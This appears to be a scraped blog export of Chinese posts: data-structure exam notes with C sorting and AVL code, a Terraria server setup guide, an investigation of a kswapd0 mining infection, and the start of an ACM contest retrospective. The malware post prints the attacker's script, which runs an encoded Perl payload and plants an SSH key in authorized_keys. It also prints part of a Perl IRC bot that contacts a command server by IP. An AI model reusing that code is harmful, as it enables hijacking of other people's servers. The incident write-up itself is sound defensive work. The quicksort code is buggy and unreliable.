数边数, 需要 $O(N^2)$\n邻接表法\n顶点表数组(顶点域 + 表头指针) + 链表(邻接点域 + 指针域)\n采用的是头插法\n优点: 节约空间, 无向图中, 顶点的度恰为链表的结点数, 有向图中为出度\n缺点: 求有向图的入度很麻烦, 需要遍历全图(可以建逆邻接表优化) ; 判断 $v_i$ 与 $v_j$ 间是否有边不如邻接矩阵\n若输入的定点信息为顶点的编号, 则建表复杂度 O(|v| + |E|), 否在 O(|V| + |E|)\n邻接多重表、十字链表\n十字链表 P70\n邻接多重表: 邻接表 , 链表信息增加\nmark：标志域，用于标记此节点是否被操作过，例如在对图中顶点做遍历操作时，为了防止多次操作同一节点，mark 域为 0 表示还未被遍历；mark 为 1 表示该节点已被遍历；\nivex 和 jvex：数据域，分别存储图中各边两端的顶点所在数组中的位置下标；\nilink：指针域，指向下一个存储与 ivex 有直接关联顶点的节点；\njlink：指针域，指向下一个存储与 jvex 有直接关联顶点的节点；\ninfo：指针域，用于存储与该顶点有关的其他信息，比如无向网中各边的权；\n(三) 图的遍历\n深度优先搜索 广度优先搜索 DFS\n邻接矩阵 O($|V|^2$); 邻接表 O(|V| + |E|)\nBFS\n邻接矩阵 O($|V|^2$); 邻接表 O(|V| + |E|)\n(四) 图的基本应用\n最小(代价) 生成树 最短路径 拓扑排序 MST Prim\n不断更新dist, 每次添加最小的 dist 的点, O($|V|^2$), 稠密图效果好 用堆优化查找最小 dist的过程, 可以得到和 Kruskal 一样的复杂度 O($|E|\\log|V|$)\nKruskal\n适合稀疏图\n高效排序下, 复杂度 O($|E|\\log|V|$)\n最短路 不能处理负权\nDijkstra\nO($|V|^2$), 稠密图效果好, 堆优化 O($|E|\\log|V|$)\nFloyd\nO($|V|^3$) 多源最短路\nTopOrder\n邻接表 + 队列优化 复杂度 O(|E| + |V|)\n四、动态查找 (一) 平衡二叉树(AVL树) (二) 散列(Hash) 表 (三) 查找算法的分析及应用\nAVL 平衡因子 $BF = h_L - h_R$, 不能超过 1, 所有在 -1 0 1之间\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 typedef struct AVLNode * AVLPosition; typedef AVLPosition AVLTree; struct AVLNode { ElementType Data; AVLTree Left; AVLTree Right; int Height; }; int Max(int a, int b) { return a \u0026gt; b ? a : b; } int GetHeight(AVLTree T) { return T == NULL ? 0 : T -\u0026gt; Height; } /* 左单旋 */ AVLTree SingleLeftRotataion(AVLTree A) { AVLTree B = A -\u0026gt; Left; A -\u0026gt; Left = B -\u0026gt; Right; B -\u0026gt; Right = A; A -\u0026gt; Height = Max(GetHeight(A -\u0026gt; Left), GetHeight(A -\u0026gt; Right)) + 1; B -\u0026gt; Height = Max(GetHeight(B -\u0026gt; Left), A -\u0026gt; Height) + 1; return B; } /* 右单旋 */ AVLTree SingleRightRotataion(AVLTree A) { AVLTree B = A -\u0026gt; Right; A -\u0026gt; Right = B -\u0026gt; Left; B -\u0026gt; Left = A; A -\u0026gt; Height = Max(GetHeight(A -\u0026gt; Left), GetHeight(A -\u0026gt; Right)) + 1; B -\u0026gt; Height = Max(GetHeight(B -\u0026gt; Left), A -\u0026gt; Height) + 1; return B; } /* 左-右 双旋 */ AVLTree DoubleLeftRightRotation(AVLTree A) { /* 先对左子树作右旋，再对整棵树作左旋 */ A -\u0026gt; Left = SingleRightRotataion(A -\u0026gt; Left); return SingleLeftRotataion(A); } /* 右-左 双旋 */ AVLTree DoubleRightLeftRotation(AVLTree A) { A -\u0026gt; Right = SingleLeftRotataion(A -\u0026gt; Right); return SingleRightRotataion(A); } AVLTree Insert(AVLTree T, ElementType X) { /* 若插入空树，则新建结点 */ if(!T) { T = (AVLTree)malloc(sizeof (struct AVLNode)); T -\u0026gt; Data = X; T -\u0026gt; Height = 1; T -\u0026gt; Left = T -\u0026gt; Right = NULL; } else if(X \u0026lt; T -\u0026gt; Data) { /* 插入到左子树 */ T -\u0026gt; Left = Insert(T -\u0026gt; Left, X); /* 判断树是否平衡 */ if(GetHeight(T -\u0026gt; Left) - GetHeight(T -\u0026gt; Right) == 2) { /* 通过 X 与左子树的值的大小判断旋转方式*/ if(X \u0026lt; T -\u0026gt; Left -\u0026gt; Data) T = SingleLeftRotataion(T); else T = DoubleLeftRightRotation(T); } } else if(X \u0026gt; T -\u0026gt; Data) { T -\u0026gt; Right = Insert(T -\u0026gt; Right, X); if(GetHeight(T -\u0026gt; Left) - GetHeight(T -\u0026gt; Right) == -2) { if(X \u0026gt; T -\u0026gt; Right -\u0026gt; Data) T = SingleRightRotataion(T); else T = DoubleRightLeftRotation(T); } } /* X == T -\u0026gt; Data 无需插入 */ T -\u0026gt; Height = Max(GetHeight(T -\u0026gt; Left), GetHeight(T -\u0026gt; Right)) + 1; return T; } 散列(Hash) 表\n类型: 符号表, 散列表, hash表\n散列函数(hash 函数): h(key)\n装填因子 $\\alpha$: 填入表的元素 / 空间大小 ; 分链法 -\u0026gt; 每个链表的平均长度 $\\alpha = 0.5$ ~ $0.8$ 为宜\n好的散列表: 1. 转换速度快 2. 冲突小\n数字关键字的散列表\n直接定址法 $h(key) = a \\times key + b$\n不会有冲突, 但要求地址和关键字集合大小一致, 大集合不适合用\n除留余数法 TableSize = 集合大小 $n$ / 允许最大装填因子 $\\alpha$\n简单情况: h(key) = key % p(小于等于 TableSize 的素数, 素数均匀分布可能性大)\n数字分析法 特殊情况特殊处理的函数\n字符串关键字的散列表\nASCII 码加和法 简单, 均匀性差\n前三个字符移位法 $h(key) = (ksy[0] + key[1] \\times 27 + key[2] \\times 27^2) mod TableSize$\n26 字符 + 空格 = 27\n冲突, 空间浪费严重 $\\alpha$ 不到 30%\n移位法 $h(key) = (\\sum_{i=0}^{n-1} key[n-i-1] \\times 32^i) \\mod TableSize$\n每个字符占 5 位, 所以为 32, 用 H \u0026lt;\u0026lt; 5 实现\nn 过大, 前面若干位可能移出界, 可以选有代表性的字符, 如大于 12 时选奇数位\n冲突处理\n开放寻址法\n发生第 i 次冲突, 试探的下一个地址加 $d_i$\n$h_i (key) = (h(key) + d_i) \\mod TableSize$\n删除会引起冲突, 所以要懒标记删除\n平均查找长度 ASL = $\\sum 每个关键字的比较次数 / 关键字个数$\n线性探测法 $d_i \\in 1, 2, \\dots , TableSize - 1$\n会出现需要多次冲突才能找到空位, 这种现象叫一次聚集\n平方探测法 $d_i = \\pm i^2, 1^2, -1^2, 2^2, -2^2, \\dots q^2, -q^2, q \\leqslant \\lfloor TableSize / 2 \\rfloor$\n如果 TableSize 是某个 $4k + 3$ 形式的素数的话, 平方探测法就可以探测到整个散列空间\n散列到同一地址的会探测相同备选单元叫 二次集聚\n双散列探测法 $d_i = i \\times h_2(key)$\n一般 $h_2(key) = p - (key \\mod p)$\n增加了计算\n再散列法 装填因子过大时, 新建一个越来两倍的散列表, 旧数据从新分到新表, 可能出现停顿\n分离链接法\n散列表地址作为指针, 指向一个链表\n查找算法的分析及应用\n顺序查找 O(N)\n二分查找 O(log N)\n二叉搜索树 最坏 O(N), 最好 O(log N)\nAVL O(log N)\n五、排序 (一) 希尔排序(Shell Sort)\n(二) 快速排序\n(三) 堆排序\n(四) 二路归并排序(Merge Sort)\n(五) 基数排序\n(六) 各种内部排序算法的比较\n(七) 排序算法的应用\n简单选择排序 时间 O(N^2), 空间 O(1)\n1 2 3 4 5 6 7 8 9 void SimpleSelect(ElementType A[], int N) { int i, j, min; for(i = 0; i \u0026lt; N - 1; i ++) { min = i; for(j = i + 1; j \u0026lt; N; j ++) if(A[j] \u0026lt; A[min]) min = j; Swap(\u0026amp;A[i], \u0026amp;A[min]); } } 堆排序\n时间 O(NlogN), 空间 从 O(N) 优化到 O(1)(最后一个元素与堆顶交换) 与堆不同的是, 这里的下标是 0 开始的, 所以左儿子 2i + 1, 右儿子 2i + 2, 父节点 $\\lfloor (i-1)/2\\rfloor$\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 void PercDown(ElementType A[], int p, int N) { /* 将 A[p] 为根的子堆调整 */ int Parent, Child; ElementType X; X = A[p]; for(Parent = p; (Parent * 2 + 1) \u0026lt; N; Parent = Child) { Child = Parent * 2 + 1; if((Child != N - 1) \u0026amp;\u0026amp; (A[Child] \u0026lt; A[Child + 1])) Child ++; if(X \u0026gt;= A[Child]) break; else A[Parent] = A[Child]; } A[Parent] = X; } void HeapSort(ElementType A[], int N) { int i; for(i = N / 2 - 1; i \u0026gt;= 0; i --) /* 建立最大堆 */ PercDown(A, i, N); for(int i = N - 1; i \u0026gt; 0; i --) { Swap(\u0026amp;A[0], \u0026amp;A[i]); PercDown(A, 0, i); } } 插入排序\n时间 O(N^2), 空间 O(1), 稳定\n1 2 3 4 5 6 7 8 9 10 void InsertionSort(ElementType A[], int N) { int i, P; ElementType Tmp; for(P = 1; P \u0026lt; N; P ++) { Tmp = A[P]; for(i = P; i \u0026gt; 0 \u0026amp;\u0026amp; A[i-1] \u0026gt; Tmp; i --) A[i] = A[i - 1]; A[i] = Tmp; } } 希尔排序\n时间最差 O(N^2), 理想 {1, 3, 7, $2^k-1$} $O(N^{5\\over 4})$, 最差 $O(N^{3\\over 2})$ 空间 O(1) 最后一个增量为 1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 void ShellSOrt(ElementType A[], int N) { int Si, D, P, i; ElementType Tmp; int Sedgewick[] = {929, 505, 209, 109, 41, 19, 5, 1, 0}; for(Si = 0; Sedgewick[Si] \u0026gt;= N; Si ++) ; for(D = Sedgewick[Si]; D \u0026gt; 0; D = Sedgewick[++Si]) { /* 插入排序 */ for( P = D; P \u0026lt; N; P ++) { Tmp = A[P]; for(i = P; i \u0026gt;= D \u0026amp;\u0026amp; A[i-D] \u0026gt; Tmp; i -= D) A[i] = A[i - D]; A[i] =Tmp; } } } 冒泡排序\n时间 O(N^2), 空间 O(1), 稳定\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 void BubbleSort(ElementType A[], int N) { int P, i; int flag; for(P = N - 1; P \u0026gt;= 0; P--) { flag = 0; for(i = 0; i \u0026lt; P; i ++) { if(A[i] \u0026gt; A[i + 1]) { Swap(\u0026amp;A[i], \u0026amp;A[i + 1]); flag = 1; } } if(!flag) break; } } 快速排序\n时间 O($N\\log N$) 最坏 O($N^2$), 空间最坏 O(N) 栈空间\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 /* 选中值 */ ElementType Median3(ElementType A[], int Left, int Right) { int Center = (Left + Right) / 2; if(A[Left] \u0026gt; A[Center]) Swap(\u0026amp;A[Left], \u0026amp;A[Center]); if(A[Left] \u0026gt; A[Right]) Swap(\u0026amp;A[Left], \u0026amp;A[Right]); if(A[Center] \u0026gt; A[Right]) Swap(\u0026amp;A[Center], \u0026amp;A[Right]); /* A[Left] \u0026lt;= A[Center] \u0026lt;= A[Right] 所以中值 A[Center]作为基准 */ Swap(\u0026amp;A[Center], \u0026amp;A[Right - 1]); /*将基准藏到右边, 只需考虑, left + 1 ... right - 2*/ return A[Right - 1]; } void Qsort(ElementType A[], int Left, int Right) { int Pivot, Cutoff, Low, High; /* 如果元素够多进入快排 */ if(Cutoff \u0026lt;= Right - Left) { Pivot = Median3(A, Left, Right); Low = Left; High = High - 1; while(1) { while (A[++Low] \u0026lt; Pivot); while (A[--High] \u0026gt; Pivot); if(Low \u0026lt; High) Swap(\u0026amp;A[Low], \u0026amp;A[High]); else break; } Swap(\u0026amp;A[Low], \u0026amp;A[Right - 1]); /* 把基准换到正确的位置 */ Qsort(A, Left, Low - 1); Qsort(A, Low + 1, Right); } else InsertionSort(A, Right - Left + 1); } 归并排序\n时间 O($N\\log N$) , 空间 O(N) ,如果在递归中建数组,则空间消耗为 O($N\\log N$);\n稳定, 常用于外部排序, 而非内部\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 void Merge(ElementType A[], ElementType TmpA[], int L, int R, int RightEnd) { int LeftEnd, NumElements, Tmp; int i; /*L ~ R - 1 与 R ~ RightEnd 合并为有序*/ LeftEnd = R - 1; /*左边终点*/ Tmp = L; /*序列起点*/ NumElements = RightEnd - L + 1; /*复制数组*/ while(L \u0026lt;= LeftEnd \u0026amp;\u0026amp; R \u0026lt;= RightEnd) { if(A[L] \u0026lt;= A[R]) TmpA[Tmp ++] = A[L++]; else TmpA[Tmp ++] = A[R++];; } while(L \u0026lt;= LeftEnd) TmpA[Tmp++] = A[L++]; while(R \u0026lt;= RightEnd) TmpA[Tmp++] = A[R++]; for(i = 0; i \u0026lt; NumElements; i ++, RightEnd --) A[RightEnd] = TmpA[RightEnd]; } void Msort(ElementType A[], ElementType TmpA[], int L, int RightEnd) { int Center; if(L \u0026lt; RightEnd) { Center = (L + RightEnd) / 2; Msort(A, TmpA, L, Center); Msort(A, TmpA, Center + 1, RightEnd); Merge(A, TmpA, L, Center + 1, RightEnd); } } void MergeSort(ElementType A[], int N) { ElementType *TmpA; TmpA = (ElementType*)malloc(N*sizeof(ElementType)); if(TmpA != NULL) { Msort(A, TmpA, 0, N - 1); free(TmpA); } } 桶排序\nN 个数据, M 个桶, 时间复杂度 O(N + M)\n基数排序 对于有 k 个关键字的情况有\n主位优先法 MSD 次位优先法 LSD 一般情况下次位优先效率高\n分配收集趟数: D, 关键字 N, 桶: R\n时间 O(D(N + R))\n由于链表操作, O(N) 常数项可能超过 Log N, 且需要额外 O(N) 空间, 稳定\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 #define MaxDigit 4 #define Radix 10 /*桶元素结点*/ typedef struct Node * PtrToNode; struct Node{ int key; PtrToNode next; }; /*桶头结点*/ struct HeadNode{ PtrToNode head, tail; }; typedef struct HeadNode Bucket[Radix]; /*返回某数的第 D 位数字*/ int GetDigit(int X, int D) { int d, i; for(i = 1; i \u0026lt;= D; i++) { d = X % Radix; X /= Radix; } return d; } void LSDRadixSort(ElementType A[], int N) { int D, Di, i; Bucket B; PtrToNode tmp, p, List = NULL; for(i = 0; i \u0026lt; Radix; i ++) B[i].head = B[i].tail = NULL; for(i = 0; i \u0026lt; N; i ++) { tmp = (PtrToNode)malloc(sizeof(struct Node)); tmp -\u0026gt; key = A[i]; tmp -\u0026gt; next = List; List = tmp; } for(D = 1; D \u0026lt;= MaxDigit; D ++) { p = List; /*分配*/ while(p) { Di = GetDigit(p -\u0026gt; key, D); tmp = p; p = p-\u0026gt;next; tmp-\u0026gt;next = NULL; if(B[Di].head == NULL) B[Di].head = B[Di].tail = tmp; else { B[Di].tail-\u0026gt;next = tmp; B[Di].tail = tmp; } } /*收集*/ List = NULL; for(Di = Radix - 1; Di \u0026gt;= 0; Di--) { if(B[Di].head) { B[Di].tail -\u0026gt; next = List; List = B[Di].head; B[Di].head = B[Di].tail = NULL; } } } for(i = 0; i \u0026lt; N; i ++) { tmp = List; List = List -\u0026gt; next; A[i] = tmp -\u0026gt; key; free(tmp); } } ","date":"2023-03-26T00:00:00Z","permalink":"https://example.com/p/%E8%80%83%E7%A0%94/","title":"考研"},{"content":"Terraria Linux 服务器搭建（支持 mod ） 简介 泰拉瑞亚 1.4 Linux 服务器搭建， TmodLoader（后简称 TML） 1.4 服务器搭建（支持mod），面向只有一点点 Linux 基础的小伙伴。\n如果只是 TML 运行后一直在 下载 或者 5分钟没反应 这个问题（win 和 Linux 通用），可以直接看 TML 安装的最后部分。\n网上泰拉服务器教程已经很多了，但是都基本都是 1.3 版本， TML 基本在 0.11.8.9 版本之前，这次本体更新到 1.4 版本，TML更新到 v2022.05.103.34 版本（本文写于2022.6.28）后有了较大的变化，搭建过程中我也走了很多弯路，所以写一篇文章，希望对大家有帮助。\n服务器优势还是很大的，可以最大支持16个人，可以长期挂载，可以同时开多个资源世界等。\n环境说明 服务器 ：腾讯云 8 核 4 G（如果要安装 TML 建议服务器 在 2核2G 以上）、操作系统 debain 11\n游戏本体：steam上的 Terraria 1.4.3.6 ，TML v2022.05.103.34\n泰拉的服务器端是免费的，在 官网 或者 Terraria wiki， TML 在 GitHub 获得最新版，也有封装完整的 docker 镜像供大家使用（这个方法我没有试过）\n我这里推荐和使用的是利用 steamcmd 的方法，先说一下优势：\n服务器与桌面端版本统一方便。 版本更新方便，steamcmd 有专门的指令更新游戏，而别的方法需要重新下载安装。 1.4 版本后的 TML 支持创意工坊直接导入 mod ，这个在服务器端也生效！！！ 服务器搭建 安装 steamcmd 习惯看文档的请看文档，里面比较详细（支持中文）, 内含 docker 安装方法。\n创建一个名为 steam 的用户帐户以安全地运行 SteamCMD，并将其与操作系统的其余部分隔离。以 root 用户身份登录时请勿运行 steamcmd——这样做会带来安全风险。\n以 root 用户身份创建 steam 用户： 1 2 3 4 useradd -m steam # 添加密码 passwd steam 进入其文件夹 1 2 3 4 5 6 7 8 9 10 11 12 cd /home/steam # 或者 su steam bash # 切换到 bash 以保证命令行体验 cd ~ # 64 位机需要 sudo add-apt-repository multiverse sudo dpkg --add-architecture i386 sudo apt update sudo apt install lib32gcc1 steamcmd 安装 Ubuntu/Debian\n1 sudo apt install steamcmd 链接 steamcmd 可执行文件： 1 ln -s /usr/games/steamcmd steamcmd 运行 Steamcmd 1 2 cd ~ steamcmd 正常情况下你会看到\n输入login + 你的用户名 然后按提示登录即可（第一次登录会需要令牌）\n安装 terraria\n1 app_update 105600 # 安装 Terraria(它在steam中的代码是 105600，不会改变) 下载完成后你应该可以在 ~/Steam/steamapps/common 下面看到 Terraria 文件夹\n里面的 TerrariaServer.bin.x86_64 就是服务器运行文件了\n1 2 3 # 新建会话 screen -S Tr ./TerrariaServer.bin.x86_64 然后就可以开始的愉快游戏了，常用指令\nTML 搭建 这个需要在本体完成的基础上进行\n如何查找游戏在steam中的代码\n我们可以看到 TML 的代码是 1281930 版本是 8980144， 所以\n1 2 # app_update \u0026lt;应用ID\u0026gt; [-beta \u0026lt;测试名称\u0026gt;] [-betapassword \u0026lt;密码\u0026gt;] [validate] app_update 1281930 8980144 validate # 如果发现安装有问题请加 validate 下载完成后，同样进入 TML 文件夹\n1 2 3 # 新建会话 screen -S Tr ./start-tModLoaderServer.sh ！！！最大的问题来了 这里演示的是 windows 下的情况，Linux服务端一样，只不过服务器上可以多看到下载信息，在下载 .net 但是国内服务器应该是下载不下来的，所以会等到死。\nwindows 和 Linux 解决方法一样，下载 .net\n我们可以在 TML 内的 dotnet/6.0.0 内看到里面是空的，所以我们要手动下载二进制文件包，丢进去\n1 2 3 4 5 6 7 cd ~/Steam/steamapps/common/tModLoader/dotnet/6.0.0 # 下载二进制文件 wget https://dotnet.microsoft.com/zh-cn/download/dotnet/thank-you/sdk-6.0.301-linux-x64-binaries # 解压文件 tar -zxvf dotnet-sdk-6.0.301-linux-x64.tar.gz windows 下操作同理\n然后运行即可 steam 的最大优势是 TML 内的mod就是 改登录的steam账号内 TML 订阅的mod，如果需要更新\n1 app_update 1281930 validate 已经成功和小伙伴玩上 1.4 版本的 灾厄mod ，请注意服务器mod与主机端应当相同。\n本文主要是为了介绍 TML 1.4 运行不起来的解决方法，下面的参考链接介绍会更为详细\n参考连接： 泰拉瑞亚服务器搭建教程（带 MOD）\n使用Linux搭建Terraria服务器，详细步骤\n","date":"2022-06-28T00:00:00Z","image":"https://example.com/post/Terraria/Photo.png","permalink":"https://example.com/p/terraria/","title":"Terraria"},{"content":"kswapd0 挖矿病毒调查 背景 3 月 6 日收到了腾讯云的异地异常登入报告，马上又收到了检测出木马的报告\n马上怀疑是服务器被植入了木马程序，但是时间比较晚了，先把服务器关机了然后睡觉\n我也没有急着重装系统，有点贪心，想看看木马长什么样，也顺便学习一下怎么清理木马程序，怎么分析受损情况，毕竟我现在是一个个人的服务器还没有对外提供服务，可以随便重装系统，但是如果是一个网站的服务器那么肯定是不能随便重装的。\n但是这个木马非常狡猾，我 3 月 6 日一天也没有找出来，也请了网安的同学来帮忙，外加腾讯给我的报错文件，我什么没有找到，一切看起来都非常正常，各种日志都没有一点痕迹连操作记录都没有，然后我就又把服务器开着等了一天。\n出现异常 很快，第二天凌晨又被警告异地登入了，但是我当时还在睡觉没处理，早上起来一开服务器发现问题大了。\n开始调查 有个程序把我的cpu直接占满了，我知道它出现了，我直接 kill 了这个程序，然后在通过查看系统的定期任务找到了它的文件，应该是只有部分了，它的很多安装步骤应该是被自己清理掉了。\n很明显它有一些定时任务，而且我每一次开机都会更新一些木马的程序，非常难找，而且输出全部重定向到了空，所以没有运行日志，当然也它没有很过分的写 shell 反弹，否在我恐怕也不能直接发现这些定期运行的脚本了。\n然后根据上面运行的脚本目录，我找到了它的一些文件\n里面有很多脚本程序，比如启动挖矿程序，为了躲避产生日志的脚本，还有一些判断系统硬件的，还有脚本杀死别的挖矿软件……，还有删除一些文件的（所以应该丢失了不少关键文件）\n当然最重要的还是要看一下挖矿程序(省略)\n1 2 3 4 5 #!/bin/sh nohup ./stop\u0026gt;\u0026gt;/dev/null \u0026amp; sleep 5 echo \u0026#34;ZXZhbCB1bnBhY2sgd......\u0026#34; | base64 --decode | perl cd ~ \u0026amp;\u0026amp; rm -rf .ssh \u0026amp;\u0026amp; mkdir .ssh \u0026amp;\u0026amp; echo \u0026#34;ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\u0026#34;\u0026gt;\u0026gt;.ssh/authorized_keys \u0026amp;\u0026amp; chmod -R go= ~/.ssh 有一个用 perl 写的程序还有一个 ssh 远程登入\n因为是 base64 压缩，所以通过解码并且将 perl 加入输出命令得到了源码（部分）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 my $processo = \u0026#39;rsync\u0026#39;; $servidor=\u0026#39;45.9.148.99\u0026#39; unless $servidor; my $porta=\u0026#39;443\u0026#39;; my @canais=(\u0026#34;#007\u0026#34;); my @adms=(\u0026#34;polly\u0026#34;,\u0026#34;molly\u0026#34;); my @auth=(\u0026#34;localhost\u0026#34;); my $linas_max=6; my $sleep=3; my $nick = getnick(); my $ircname = getnick(); my $realname = (`uname -a`); my $acessoshell = 1; my $prefixo = \u0026#34;! \u0026#34;; my $estatisticas = 0; my $pacotes = 1; my $VERSAO = \u0026#39;0.2a\u0026#39;; $SIG{\u0026#39;INT\u0026#39;} = \u0026#39;IGNORE\u0026#39;; $SIG{\u0026#39;HUP\u0026#39;} = \u0026#39;IGNORE\u0026#39;; $SIG{\u0026#39;TERM\u0026#39;} = \u0026#39;IGNORE\u0026#39;; $SIG{\u0026#39;CHLD\u0026#39;} = \u0026#39;IGNORE\u0026#39;; $SIG{\u0026#39;PS\u0026#39;} = \u0026#39;IGNORE\u0026#39;; use IO::Socket; use Socket; use IO::Select; chdir(\u0026#34;/\u0026#34;); $servidor=\u0026#34;$ARGV[0]\u0026#34; if $ARGV[0]; $0=\u0026#34;$processo\u0026#34;.\u0026#34;\\0\u0026#34;; my $pid=fork; exit if $pid; die \u0026#34;Problema com o fork: $!\u0026#34; unless defined($pid); my %irc_servers; my %DCC; my $dcc_sel = new IO::Select-\u0026gt;new(); sub getnick { return \u0026#34;x\u0026#34;.int(rand(9000)).int(rand(9000)); } sub getident { my $retornoident = \u0026amp;_get(\u0026#34;http://www.minpop.com/sk12pack/idents.php\u0026#34;); my $identchance = int(rand(99000)); if ($identchance \u0026gt; 30) { return $nick; } else { return $retornoident; } return $retornoident; } sub getname { my $retornoname = \u0026amp;_get(\u0026#34;http://www.minpop.com/sk12pack/names.php\u0026#34;); return $retornoname; } sub getident2 { my $length=shift; $length = 3 if ($length \u0026lt; 3); my @chars=(\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;,\u0026#39;A\u0026#39;..\u0026#39;Z\u0026#39;,\u0026#39;1\u0026#39;..\u0026#39;9\u0026#39;); foreach (1..$length) { $randomstring.=$chars[rand @chars]; } return $randomstring; } ...... 其中有一个很明显的 ip 地址 45.9.148.99 通过 IP 地址定位，发现是在荷兰，臭名昭著~\n还有一个主文件 kwsapd0 但是是经过特殊加密的，暂时不会解码的手段，不过根据网上的查询多半是 XMRig 编译的 Linux 平台门罗币挖矿木马了。\n这次的木马调查也只能到此结束了，后面深入的事情也不是我有能力去做的了，只是很讨厌这种行为，通过木马挖矿就是小偷行为，偷别人的算力，非常可耻！\n总结 自己的服务器要小心，不要被别人拿去白打工了，密码最好复杂一点，各个用户的都要复杂一点，因为不是 sudo用户也有可能被入侵，密码最好定期跟换，对于端口开放要谨慎，要限制访问 IP。\n这次的木马时间算是给了我一个教训吧，辛亏服务器内数据不多，损失也不算大，但是以后还是要多加小心。\n","date":"2022-03-07T00:00:00Z","image":"https://example.com/post/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%97%85%E6%AF%92/qq_pic_merged_1646629112550.jpg","permalink":"https://example.com/p/kswapd0%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E8%AE%B0%E5%BD%95/","title":"Kswapd0挖矿病毒记录"},{"content":"ACM 退役总结 ​\t终于还是到了退役的那一天，大学的 ACM 之旅也到此结束了。想写一篇文章回顾一下自己参加 ACM 的整个历程，为自己这一年以来的学习历程做一个总结。\n初识 $Fibonacci$ 数列 假设一对刚出生的小兔一个月后就能长成大兔，再过一个月就能生下一对小兔，并且此后每个月都生一对小兔，一年内没有发生死亡，问：一对刚出生的兔子，一年内繁殖成多少对兔子?\n这是斐波那契数列非常经典的例题，对于第 $n$ 项 ：$A_n = A_{n-1} + A_{n-2}$。\n​\t其实参加 ACM 竞赛对大一的我来说是一条未曾设想的道路，甚至学不学计算机专业都还没有确定。我的学院希望大家宽厚基础，大二再选择自己的专业。我第一次了解到这个 ACM 竞赛还是大一下学期，童孟军老师（ACM 集训队的教练）来我学院宣传计算机专业，在向大家介绍杰出的计算机毕业生中很多都有 ACM 经历，而我当时想选择计算机专业，所以我就打算参加 ACM 竞赛来提高自己。就是这种机缘巧合下我走上了算法竞赛之路。\n求 $Fibonacci$ 数列的第 $n(n \\leqslant 30)$ 项 C 语言最基础的递归训练题目，$fib(n) = fib(n - 1) + fib(n - 2)$\n​\t刚接触 ACM 竞赛我非常冲动，也不管自己有没有一点基础，就报名了当时的新生赛，我报名新生赛的时候离比赛只有一个星期的时间，而当时的我连 C 语言都不会！然后就一星期速成 C 语言参加了比赛。\n​\t第一次打新生赛真的啥都不会，我还记得我当时只写出了一道题，被同级的集训队队员吊打了，但是我也没有因此放弃。我在大一的暑假参加了 ACM 集训队的暑期集训，在最开始的一段时间，我几乎在每次个人赛中都排在倒数。我深刻的认识到了自己的菜，然后就每天都在实验室里面学习，在那段时间的学习过程中，我感受到了算法的神奇魅力，我渐渐的对算法产生了浓厚的兴趣，我因此热爱上了算法，也热爱 ACM 比赛，我的目标也从一开始参加 ACM 为了提高自己的能力，到后来我希望自己能够在比赛中拿到一块奖牌来证明自己。\n求 $Fibonacci$ 数列的第 $n(n \\leqslant 10^6)$ 项（对 $10^9 + 9$ 取模） 在递归中，对于每一项的 $fib(n)$ 都搜索到了底，所以复杂度达到了 $O(2 ^ n)$，可以通过记忆化搜索或者动态规划的方式线性递推得到答案，这样的话复杂度就为 $O(n)$。\n​\t经过一个暑假的训练，我对算法竞赛有了更深的了解、学习了很多知识、打了很多练习赛，渐渐的我在个人赛中的排名一点点向前靠了，在大二上开学的那个学期的校赛中，我拿到了校赛的三等奖，这也是我第一次获奖，也是我第一次拿到竞赛奖金，因为当时的校赛是有华为奖的，所以奖金比较高，那 $500$ 元的奖金让我高兴了很久.\n​\t也因为校赛拿到了三等奖，我被分到了我们学校的三队参加的高校天梯赛（$10$ 人一队），那也是我第一次参加国赛，虽然这个比赛的含金量相对于 ICPC / CCPC（国际 / 中国 大学生程序设计竞赛） 而言不高，但是也是被学校认可的一个国赛啊，在那次比赛中我发挥的并不是很好，但是靠着队内大佬的超强实力，我们队拿到了国家级银奖，又到手 $500$ 元，这两个奖项给了我极大的动力。我既能做着自己喜欢的事情（学习算法）又可以收获国奖还有不少奖金然我真的非常开心。而且当时我绩点不高只拿了三等奖学金，不如我的比赛奖金，而我们学校没有保研，绩点对我来说重要性一下子降得很低，所以我投入了大量经历在训练上面，那个学期我的算法水平算是突飞猛进。\n求 $Fibonacci$ 数列的第 $n(n \\leqslant 10^{18})$ 项（对 $10^9 + 9$ 取模） 对于 $10^{18}$ 这个大小，线性递推的复杂度的显然已经无法求出答案了，所以可以通过矩阵递推 + 